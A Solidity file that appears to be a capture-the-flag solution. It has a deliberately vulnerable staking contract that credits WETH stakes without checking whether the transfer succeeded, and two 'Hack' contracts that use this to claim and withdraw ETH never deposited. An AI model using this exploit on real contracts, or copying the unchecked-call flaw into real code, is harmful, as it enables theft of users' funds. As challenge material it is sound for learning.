// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Stake {
    uint256 public totalStaked;
    mapping(address => uint256) public UserStake;
    mapping(address => bool) public Stakers;
    address public WETH;

    constructor(address _weth) payable {
        totalStaked += msg.value;
        WETH = _weth;
    }

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }

    function StakeWETH(uint256 amount) public returns (bool) {
        require(amount > 0.001 ether, "Don't be cheap");
        (, bytes memory allowance) = WETH.call(
            abi.encodeWithSelector(0xdd62ed3e, msg.sender, address(this))
        );
        require(
            bytesToUint(allowance) >= amount,
            "How am I moving the funds honey?"
        );
        totalStaked += amount;
        UserStake[msg.sender] += amount;
        (bool transfered, ) = WETH.call(
            abi.encodeWithSelector(
                0x23b872dd,
                msg.sender,
                address(this),
                amount
            )
        );
        Stakers[msg.sender] = true;
        return transfered;
    }

    function Unstake(uint256 amount) public returns (bool) {
        require(UserStake[msg.sender] >= amount, "Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        return success;
    }

    function bytesToUint(bytes memory data) internal pure returns (uint256) {
        require(data.length >= 32, "Data length must be at least 32 bytes");
        uint256 result;
        assembly {
            result := mload(add(data, 0x20))
        }
        return result;
    }
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

//note: This contract only use to test the logic is right or not
contract Hack {
    Stake public target;
    IERC20 public weth;

    constructor(address _target) payable {
        target = Stake(_target);
        weth = IERC20(target.WETH());
    }

    function hack() public {
        target.StakeETH{value: 0.0011 ether}();
        weth.approve(address(target), 20 ether);
        target.StakeWETH(20 ether);
        target.Unstake(20.0011 ether);
    }

    receive() external payable {
        revert();
    }
}

contract Hack2 {
    Stake public target;
    IERC20 public weth;

    constructor(address _target) payable {
        target = Stake(_target);
        weth = IERC20(target.WETH());
    }

    function hack() public {
        weth.approve(address(target), 20 ether);
        target.StakeWETH(20 ether);
    }

    receive() external payable {
        revert();
    }
}
